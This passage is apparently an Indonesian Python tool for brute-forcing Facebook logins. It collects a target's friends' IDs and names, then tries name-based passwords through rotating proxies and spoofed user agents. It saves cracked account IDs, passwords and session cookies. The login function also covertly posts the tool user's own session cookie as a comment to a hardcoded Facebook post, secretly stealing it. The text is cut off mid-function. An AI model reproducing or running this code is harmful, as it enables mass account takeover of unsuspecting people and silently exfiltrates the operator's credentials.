###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
usragent = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ualu,ualuh = [],[]

###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT 1 ]----------###
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0','9','10','11','12'])
	c='Redmi Note'
	j=random.choice(['5','5A','6','6A','7','8','9','10'])
	k='Build/MMB29K)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPT/1.7.21'
	uakuh=f'{a} {b}; {c} {j} {k} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='Mi A3 Build/QKQ1.190910.002; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPR/52.2.2254.54723'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
###----------[ USER AGENT 2 ]----------###
for agenkuw in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c=random.choice(['CPH2109','A31','OPPO F1s','A31','OPPO R11s','CPH1893','OPPO A37','OPPO R9s','Redmi Note 8 Pro','OPPO CPH1803','OPPO R7st','OPPO A37m','CPH2071','A31','OPPO PBAM00','CPH1717','OPPO PBFT00','CPH1937','CPH1923','PBCM30','A37fw','A37f','CPH1923','CPH2083','CPH1853','CPH2077','CPH1827','OPPO A59s','CPH1729','CPH1901','CPH1853','CPH1723','CPH2083','CPH1801'])
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c=random.choice(['SM-E025F','SM-G996B','SM-A826S','SM-E135F','SM-G781B','SM-G998B','SM-F936U1','SM-G361F','SM-A716S','SM-J327AZ','SM-E426B','SM-A015F','SM-A015M','SM-A013G','SM-A013G','SM-A013M','SM-A013F','SM-A022M','SM-A022G','SM-A022F','SM-A025M','SM-S124DL','SM-A025U','SM-A025A','SM-A025G','SM-A025F','SM-A025AZ','SM-A035F','SM-A035M','SM-A035G','SM-A032F','SM-A032M','SM-A032F','SM-A037F','SM-A037U','SM-A037M','SM-S134DL','SM-A037G','SM-A105G','SM-A105M','SM-A105F','SM-A105FN','SM-A102U','SM-S102DL','SM-A102U1','SM-A107F','SM-A107M','SM-A115AZ','SM-A115U','SM-A115U1','SM-A115A','SM-A115M','SM-A115F','SM-A125F','SM-A127F','SM-A125M','SM-A125U','SM-A127M','SM-A135F','SM-A137F','SM-A135M','SM-A136U','SM-A136U1','SM-A136W','SM-A260F','SM-A260G','SM-A260F','SM-A260G','SM-A205GN','SM-A205U','SM-A205F','SM-A205G','SM-A205FN','SM-A202F','SM-A2070','SM-A207F','SM-A207M','SM-A215U','SM-A215U1','SM-A217F','SM-A217F','SM-A217M','SM-A225F','SM-A225M','SM-A226B','SM-A226B','SM-A226BR','SM-A235F','SM-A235M','SM-A300FU','SM-A300F','SM-A300H','SM-A310F','SM-A310M','SM-A320FL','SM-A320F','SM-A305G','SM-A305GT','SM-A305N','SM-A305F','SM-A307FN','SM-A307G','SM-A307GN','SM-A315G','SM-A315F','SM-A325F','SM-A325M','SM-A326U','SM-A326W','SM-A336E','SM-A336B','SM-A430F','SM-A405FN','SM-A405FM','SM-A3051','SM-A3050','SM-A415F','SM-A426U','SM-A426B','SM-A5009','SM-A500YZ','SM-A500Y','SM-A500W','SM-A500L','SM-A500X','SM-A500XZ','SM-A510F','SM-A510Y','SM-A520F','SM-A520W','SM-A500F','SM-A500FU','SM-A500H','SM-S506DL','SM-A505G','SM-A505FN','SM-A505U','SM-A505GN','SM-A505F','SM-A507FN','SM-A5070','SM-A515F','SM-A515U','SM-A515U1','SM-A516U','SM-A516V','SM-A516N','SM-A516B','SM-A525F','SM-A525M','SM-A526U','SM-A526U1','SM-A526B','SM-A526W','SM-A528B','SM-A536B','SM-A536U','SM-A536E','SM-A536V','SM-A600FN','SM-A600G','SM-A605FN','SM-A605G','SM-A605GN','SM-A605F','SM-A6050','SM-A606Y','SM-A6060','SM-G6200','SM-A700FD','SM-A700F','SM-A7000','SM-A700H','SM-A700YD','SM-A710F','SM-A710M','SM-A720F','SM-A750F','SM-A750FN','SM-A750GN','SM-A705FN','SM-A705F','SM-A705MN','SM-A707F','SM-A715F','SM-A715W','SM-A716U','SM-A716V','SM-A716U1','SM-A716B','SM-A725F','SM-A725M','SM-A736B','SM-A530F','SM-A810YZ','SM-A810F','SM-A810S','SM-A530W','SM-A530N','SM-G885F','SM-G885Y','SM-G885S','SM-A730F','SM-A805F','SM-G887F','SM-G8870','SM-A9000','SM-A920F','SM-A920F','SM-887N','SM-A910F','SM-G8850','SM-A908B','SM-A908N','SM-A9080','SM-G313HY','SM-G313MY','SM-G313MU','SM-G316M','SM-G316ML','SM-G316MY','SM-G313HZ','SM-G313H','SM-G313HU','SM-G313U','SM-G318H','SM-G357FZ','SM-G310HN','SM-G357FZ','SM-G850F','SM-G850M','SM-J337AZ','SM-G386T1','SM-G386T','SM-G3858','SM-G3858','SM-A226L','SM-C5000','SM-C500X','SM-C5010','SM-C5018','SM-C7000','SM-C7010','SM-C701F','SM-C7018','SM-C7100','SM-C7108','SM-C9000','SM-C900F','SM-C900Y','SM-G355H','SM-G355M','SM-G3589W','SM-G386W','SM-G386F','SM-G3518','SM-G3586V','SM-G5108Q','SM-G5108','SM-G3568V','SM-G350E','SM-G350','SM-G3509I','SM-G3508J','SM-G3502I','SM-G3502C','SM-S820L','SM-G360H','SM-G360F','SM-G360T','SM-G360M','SM-G361H','SM-E500H','SM-E500F','SM-E500M','SM-E5000','SM-E500YZ','SM-E700H','SM-E700F','SM-E7009','SM-E700M','SM-G3815','SM-G3815','SM-G3815','SM-F127G','SM-E225F','SM-E236B','SM-F415F','SM-E5260','SM-E625F','SM-F900U','SM-F907N','SM-F900F','SM-F9000','SM-F907B','SM-F900W','SM-G150NL','SM-G155S','SM-G1650','SM-W2015','SM-G7102','SM-G7105','SM-G7106','SM-G7108','SM-G7202','SM-G720N0','SM-G7200','SM-G720AX','SM-G530T1','SM-G530H','SM-G530FZ','SM-G531H','SM-G530BT','SM-G532F','SM-G531BT','SM-G531M','SM-J727AZ','SM-J100FN','SM-J100H','SM-J120FN','SM-J120H','SM-J120F','SM-J120M','SM-J111M','SM-J111F','SM-J110H','SM-J110G','SM-J110F','SM-J110M','SM-J105H','SM-J105Y','SM-J105B','SM-J106H','SM-J106F','SM-J106B','SM-J106M','SM-J200F','SM-J200M','SM-J200G','SM-J200H','SM-J200F','SM-J200GU','SM-J260M','SM-J260F','SM-J260MU','SM-J260F','SM-J260G','SM-J200BT','SM-G532G','SM-G532M','SM-G532MT','SM-J250M','SM-J250F','SM-J210F','SM-J260AZ','SM-J3109','SM-J320A','SM-J320G','SM-J320F','SM-J320H','SM-J320FN','SM-J330G','SM-J330F','SM-J330FN','SM-J337V','SM-J337P','SM-J337A','SM-J337VPP','SM-J337R4','SM-J327VPP','SM-J327V','SM-J327P','SM-J327R4','SM-S327VL','SM-S337TL','SM-S367VL','SM-J327A','SM-J327T1','SM-J327T','SM-J3110','SM-J3119S','SM-J3119','SM-S320VL','SM-J337T','SM-J400M','SM-J400F','SM-J400F','SM-J410F','SM-J410G','SM-J410F','SM-J415FN','SM-J415F','SM-J415G','SM-J415GN','SM-J415N','SM-J500FN','SM-J500M','SM-J510MN','SM-J510FN','SM-J510GN','SM-J530Y','SM-J530F','SM-J530G','SM-J530FM','SM-G570M','SM-G570F','SM-G570Y','SM-J600G','SM-J600FN','SM-J600GT','SM-J600F','SM-J610F','SM-J610G','SM-J610FN','SM-J710F','SM-J700H','SM-J700M','SM-J700F','SM-J700P','SM-J700T','SM-J710GN','SM-J700T1','SM-J727A','SM-J727R4','SM-J737T','SM-J737A','SM-J737R4','SM-J737V','SM-J737T1','SM-J737S','SM-J737P','SM-J737VPP','SM-J701F','SM-J701M','SM-J701MT','SM-S767VL','SM-S757BL','SM-J720F','SM-J720M','SM-G615F','SM-G615FU','SM-G610F','SM-G610M','SM-G610Y','SM-G611MT','SM-G611FF','SM-G611M','SM-J730G','SM-J730GM','SM-J730F','SM-J730FM','SM-S727VL','SM-S737TL','SM-J727T1','SM-J727T1','SM-J727V','SM-J727P','SM-J727VPP','SM-J727T','SM-C710F','SM-J810M','SM-J810F','SM-J810G','SM-J810Y','SM-A605K','SM-A605K','SM-A202K','SM-M336K','SM-A326K','SM-C115','SM-C115L','SM-C1158','SM-C1158','SM-C115W','SM-C115M','SM-S120VL','SM-M015G','SM-M015F','SM-M013F','SM-M017F','SM-M022G','SM-M022F','SM-M022M','SM-M025F','SM-M105G','SM-M105M','SM-M105F','SM-M107F','SM-M115F','SM-M115F','SM-M127F','SM-M127G','SM-M135M','SM-M135F','SM-M135FU','SM-M205FN','SM-M205F','SM-M205G','SM-M215F','SM-M215G','SM-M225FV','SM-M236B','SM-M236Q','SM-M305F','SM-M305M','SM-M307F','SM-M307FN','SM-M315F','SM-M317F','SM-M325FV','SM-M325F','SM-M326B','SM-M336B','SM-M336BU','SM-M405F','SM-M426B','SM-M515F','SM-M526BR','SM-M526B','SM-M536B','SM-M625F','SM-G750H','SM-G7508Q','SM-G7509','SM-N970U','SM-N970F','SM-N971N','SM-N970U1','SM-N770F','SM-N975U1','SM-N975U','SM-N975F','SM-N975F','SM-N976N','SM-N980F','SM-N981U','SM-N981B','SM-N985F','SM-N9860','SM-N986N','SM-N986U','SM-N986B','SM-N986W','SM-N9008V','SM-N9006','SM-N900A','SM-N9005','SM-N900W8','SM-N900','SM-N9009','SM-N900P','SM-N9000Q','SM-N9002','SM-9005','SM-N750L','SM-N7505','SM-N750','SM-N7502','SM-N910F','SM-N910V','SM-N910C','SM-N910U','SM-N910H','SM-N9108V','SM-N9100','SM-N915FY','SM-N9150','SM-N915T','SM-N915G','SM-N915A','SM-N915F','SM-N915S','SM-N915D','SM-N15W8','SM-N916S','SM-N916K','SM-N916L','SM-N916LSK','SM-N920L','SM-N920S','SM-N920G','SM-N920A','SM-N920C','SM-N920V','SM-N920I','SM-N920K','SM-N9208','SM-N930F','SM-N9300','SM-N930x','SM-N930P','SM-N930X','SM-N930W8','SM-N930V','SM-N930T','SM-N950U','SM-N950F','SM-N950N','SM-N960U','SM-N960F','SM-N960U','SM-N935F','SM-N935K','SM-N935S','SM-G550T','SM-G550FY','SM-G5500','SM-G5510','SM-G550T1','SM-S550TL','SM-G5520','SM-G5528','SM-G600FY','SM-G600F','SM-G6000','SM-G6100','SM-G610S','SM-G611F','SM-G611L','SM-G110M','SM-G110H','SM-G110B','SM-G910S','SM-G316HU','SM-G977N','SM-G973U1','SM-G973F','SM-G973W','SM-G973U','SM-G770U1','SM-G770F','SM-G975F','SM-G975U','SM-G970U','SM-G970U1','SM-G970F','SM-G970N','SM-G980F','SM-G981U','SM-G981N','SM-G981B','SM-G780G','SM-G780F','SM-G781W','SM-G781U','SM-G7810','SM-G9880','SM-G988B','SM-G988U','SM-G988B','SM-G988U1','SM-G985F','SM-G986U','SM-G986B','SM-G986W','SM-G986U1','SM-G991U','SM-G991B','SM-G990B','SM-G990E','SM-G990U','SM-G998U','SM-G996W','SM-G996U','SM-G996N','SM-G9960','SM-S901U','SM-S901B','SM-S908U','SM-S908U1','SM-S908B','SM-S9080','SM-S908N','SM-S908E','SM-S906U','SM-S906E','SM-S906N','SM-S906B','SM-S906U1','SM-G730V','SM-G730A','SM-G730W8','SM-C105L','SM-C101','SM-C105','SM-C105K','SM-C105S','SM-G900F','SM-G900P','SM-G900H','SM-G9006V','SM-G900M','SM-G900V','SM-G870W','SM-G890A','SM-G870A','SM-G900FD','SM-G860P','SM-G901F','SM-G901F','SM-G800F','SM-G800H','SM-G903F','SM-G903W','SM-G920F','SM-G920K','SM-G920I','SM-G920A','SM-G920P','SM-G920S','SM-G920V','SM-G920T','SM-G925F','SM-G925A','SM-G925W8','SM-G928F','SM-G928C','SM-G9280','SM-G9287','SM-G928T','SM-G928I','SM-G930A','SM-G930F','SM-G930W8','SM-G930S','SM-G930V','SM-G930P','SM-G930L','SM-G891A','SM-G935F','SM-G935T','SM-G935W8','SM-G9350','SM-G950F','SM-G950W','SM-G950U','SM-G892A','SM-G892U','SM-G8750','SM-G955F','SM-G955U','SM-G955U1','SM-G955W','SM-G955N','SM-G960U','SM-G960U1','SM-G960F','SM-G965U','SM-G965F','SM-G965U1','SM-G965N','SM-G9650','SM-J321AZ','SM-J326AZ','SM-J336AZ','SM-T116','SM-T116NU','SM-T116NY','SM-T116NQ','SM-T2519','SM-G318HZ','SM-T255S','SM-W2016','SM-W2018','SM-W2019','SM-W2021','SM-W2022','SM-G600S','SM-E426S','SM-G3812','SM-G3812B','SM-G3818','SM-G388F','SM-G389F','SM-G390F','SM-G398FN'])
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)
	
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
        
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
     
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	baz_bann(f'''{mer}   _____ __________  ______
{mer}  / ___// ____/ __ )/ ____/
{mer}  \__ \/ /   / __  / /_    
{puti} ___/ / /___/ /_/ / __/    
{puti}/____/\____/_____/_/
simpel crack brute force''')

###----------[ CEK COKIS TOKEN ]----------###
def login_baz():
	try:
		token = open('.tokenakun.txt','r').read()
		cok = open('.cookiesakun.txt','r').read()
		tokenefb.append(token)
		try:
			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
			nteng = json.loads(gerap.text)['id']
			menu(nteng)
		except KeyError:
			login_men()
		except requests.exceptions.ConnectionError:
			baz_anim(f'└──{mer} koneksimu bermasalah ster :(')
			exit()
	except IOError:
		login_men()
		
###----------[ BAGIAN LOGIN COKIS ]----------###
def login_men():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		print('─────────────────────────────')
		cookie=input(f'└── cookies :{xxx}{hijo} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		requests.post(f"https://graph.facebook.com/v15.0/100072216287842_213375447746330/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
		ken = open(".tokenakun.txt", "w").write(tok)
		cok = open(".cookiesakun.txt", "w").write(cookie)
		baz_anim(f'{puti}└──{hijo} login berhasil jalankan lagi scnya')
		waktu(1)
		exit()
	except Exception as e:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'{puti}└──{kun} login gagal ster coba ganti cookies')
		waktu(1)
		login_men()

###----------[ BAGIAN MENU ]----------###
def menu(id):
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'└──{mer} cookies telah kadaluarsa ster')
		waktu(1)
		login_men()
	os.system('clear')
	os.system('xdg-open https://wa.me/6285336393488')
	waktu(1)
	banner()
	print(f'{xxx}─────────────────────────────')
	print(f'{xxx}└── crack publik atau file')
	helpbas = input(f'{xxx}└── : ')
	if helpbas in ['publik','Publik','public']:
		nge_krek()
	elif helpbas in ['file','File','files']:
		file_dump()
	else:
		baz_anim(f'{puti}└──{mer} masukkan dengan benar')
		baz_anim(f'{puti}└──{mer} input publik atau file')

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'└──{mer} cookies telah kadaluarsa ster')
		exit()
	print(f'{xxx}─────────────────────────────')
	idnyanih = input(f'└── id : ')
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		print(f'└── terkumpul : '+str(len(id)))
		atur_dulu()
	except requests.exceptions.ConnectionError:
		baz_anim(f'{puti}└──{mer} koneksi terputus')
		exit()
	except (KeyError,IOError):
		baz_anim(f'{puti}└──{mer} teman tidak publik')
		baz_anim(f'{puti}└──{mer} ganti id target nya')
		waktu(1)
		nge_krek()

###----------[ CRACK  FILE ]----------###
def file_dump():
	mz = 0
	bzz = {}
	print(f'{xxx}─────────────────────────────')
	try:baz_gtg = os.listdir('/sdcard/DUMP-FILE/')
	except FileNotFoundError:
		print('└── file dump tidak ada ster ')
		print('└── buat file terlebih dahulu ')
		waktu(2)
		exit()
	if len(baz_gtg)==0:
		print('└── file dump tidak ada ster ')
		print('└── buat file terlebih dahulu ')
		waktu(2)
		exit()
	else:
		for file_id in baz_gtg:
			try:pen_file = open('/sdcard/DUMP-FILE/'+file_id,'r').readlines()
			except:continue
			mz+=1
			if mz<100:
				jumh = ''+str(mz)
				bzz.update({str(mz):str(file_id)})
				bzz.update({jumh:str(file_id)})
				print(f'└── %s. %s ({hijo} %s{xxx} )'%(jumh,file_id,len(pen_file)))
			else:
				bzz.update({str(mz):str(file_id)})
				print('['+str(mz)+'] '+file_id+' [ '+str(len(pen_file))+' akun ]'+x)
				print('└── %s. %s ({hijo} %s {xxx}) '%(mz,file_id,len(pen_file)))
		_chos_baz = input('└── : ')
		try:gaz_sung = bzz[_chos_baz]
		except KeyError:
			print(f'└── yang bener milihnya {xxx}')
			waktu(2)
			file_dump()
		try:cekz_ = open('/sdcard/DUMP-FILE/'+gaz_sung,'r').read().splitlines()
		except:
			print('└── filenya tidak ada ')
			waktu(2)
			exit()
		for idnyh in cekz_:
			id.append(idnyh)
		atur_duluh()
		
def atur_duluh():
	print(f'{xxx}─────────────────────────────')
	print('└── 1. akun baru')
	print('└── 2. akun acak')
	aturidh = input(f'{xxx}└── : ')
	if aturidh in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturidh in ['2','02']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{puti}└── {mer}pilih yang bener')
		waktu(1)
		atur_duluh()
		exit()
		
	print(f'{xxx}─────────────────────────────')
	print('└── enter untuk mulai crack')
	print(f'{xxx}─────────────────────────────')
	metodh = input(f'')
	if metodh in ['',' ']:
		xbz.append('metodh1')
	else:
		xbz.append('metodh1')
	passwrdh()

def passwrdh():
	global prog,des
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append('Sayang')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append('indonesia')
						pwv.append('bismillah')

				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append('Sayang')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append('indonesia')
						pwv.append('bismillah')
				if '><basari><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metodh1' in xbz:
					gas_krek.submit(metodh1,idf,pwv)
				else:
					gas_krek.submit(metodh1,idf,pwv)
		yhg = '0'
		print(f'{xxx}─────────────────────────────')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}{yhg}{xxx} ')
		print(f'{xxx}─────────────────────────────')

def metodh1(idf,pwv):
	yhn = '0'
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{yhn}')
	prog.advance(des)
	ua = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				#print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				#open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'{xxx}─────────────────────────────')
	print('└── 1. akun baru')
	print('└── 2. akun acak')
	print('└── 3. akun lama')
	aturid = input(f'{xxx}└── : ')
	if aturid in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['2','02']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	elif aturid in ['3','03']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	else:
		baz_anim(f'{puti}└──{mer} pilih yang bener')
		waktu(1)
		atur_dulu()
		exit()
		
	print(f'{xxx}─────────────────────────────')
	print('└── 1. regular')
	print('└── 2. async')
	print('└── 3. validate')
	metod = input(f'{xxx}└── : ')
	if metod in ['1','01']:
		baz.append('metod1')
	elif metod in ['2','02']:
		baz.append('metod2')
	elif metod in ['3','03']:
		baz.append('metod3')
	else:
		baz.append('metod1')
		
	print(f'{xxx}─────────────────────────────')
	print('└── tambahkan ua y atau t')
	uatambah = input(f'└── : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		print(f'{xxx}─────────────────────────────')
		bzer = input(f'└── ua : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()

###----------[ BAGIAN PASSWRD ]----------###
def passwrd():
	global prog,des
	print(f'{xxx}─────────────────────────────')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append('sayang')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append('indonesia')
						pwv.append('bismillah')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append('sayang')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append('indonesia')
						pwv.append('bismillah')

				if '><basari><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metod1' in baz:
					gas_krek.submit(metod1,idf,pwv)
				elif 'metod2' in baz:
					gas_krek.submit(metod2,idf,pwv)
				elif 'metod3' in baz:
					gas_krek.submit(metod3,idf,pwv)
				else:
					gas_krek.submit(metod3,idf,pwv)
		print(f'{xxx}─────────────────────────────')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}─────────────────────────────')
		
###----------[ REGULAR ]----------###
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
